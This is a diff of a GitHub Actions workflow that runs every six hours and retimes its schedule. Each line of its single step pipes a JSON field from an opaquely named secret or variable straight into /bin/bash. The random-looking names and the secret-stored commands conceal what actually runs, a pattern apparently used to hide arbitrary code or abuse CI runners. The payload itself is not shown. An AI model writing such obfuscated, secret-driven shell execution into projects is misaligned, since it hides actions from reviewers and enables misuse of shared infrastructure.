@@ -1,30 +1,26 @@
 name: duanzhixing2016
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 5/6 * * *'
-
+    - cron: '15 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: duanzhixing2016
         env:
-          tm09994: ${{ secrets.tm09994 }}
+          z8: ${{ secrets.z8 }}
         run: |
-          echo $tm09994 | jq -r .qvfqu58 | /bin/bash
-          echo $ok81 | jq -r .yaluk622 | /bin/bash
-          echo $xd2286 | jq -r .wsdxl80 | /bin/bash
-          echo $r80 | jq -r .vhdfb59656 | /bin/bash
-          echo $sshny555 | jq -r .pe962 | /bin/bash
-          echo $mr933 | jq -r .b71 | /bin/bash
-          echo $ux98 | jq -r .lehw76 | /bin/bash
-          echo $tq01055 | jq -r .id51 | /bin/bash
-          echo $ku77948 | jq -r .lvp4633 | /bin/bash
-          echo $ufw2564 | jq -r .jjjcw73112 | /bin/bash
-          echo $whi70 | jq -r .inmp3 | /bin/bash
-          echo $pw0831 | jq -r .u4 | /bin/bash
+          echo $z8 | jq -r .deub369 | /bin/bash
+          echo $qp7 | jq -r .nykno70 | /bin/bash
+          echo $se3426 | jq -r .xsv49 | /bin/bash
+          echo $vp95 | jq -r .qi07 | /bin/bash
+          echo $rek1998 | jq -r .qfkw016 | /bin/bash
+          echo $iuv6693 | jq -r .oso87571 | /bin/bash
+          echo $u0 | jq -r .poyp612 | /bin/bash
+          echo $voq22451 | jq -r .sc8646 | /bin/bash
+          echo $ue6676 | jq -r .kzq4975 | /bin/bash
+          echo $z63 | jq -r .tt347 | /bin/bash
+          echo $hkpey98169 | jq -r .nmii84254 | /bin/bash
 
